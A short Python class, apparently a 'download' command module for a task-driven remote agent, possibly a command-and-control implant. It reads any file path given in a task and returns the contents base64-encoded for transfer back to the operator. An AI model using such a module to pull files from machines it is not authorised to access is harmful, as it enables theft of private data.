import base64
import os
from Models.Command import Command
from Models.Task import Task


class DownloadCommand(Command):
    def __init__(self):
        self.name = "download"

    def execute(self, task: Task) -> str:
        arguments = task.get_arguments()
        if not arguments or not arguments[0]:
            return "Error: path required"
        path = arguments[0]
        try:
            with open(path, 'rb') as f:
                data = f.read()
            filename = os.path.basename(path)
            encoded = base64.b64encode(data).decode()
            return f"FILE:{filename}:{encoded}"
        except Exception as e:
            return f"Error: {str(e)}"
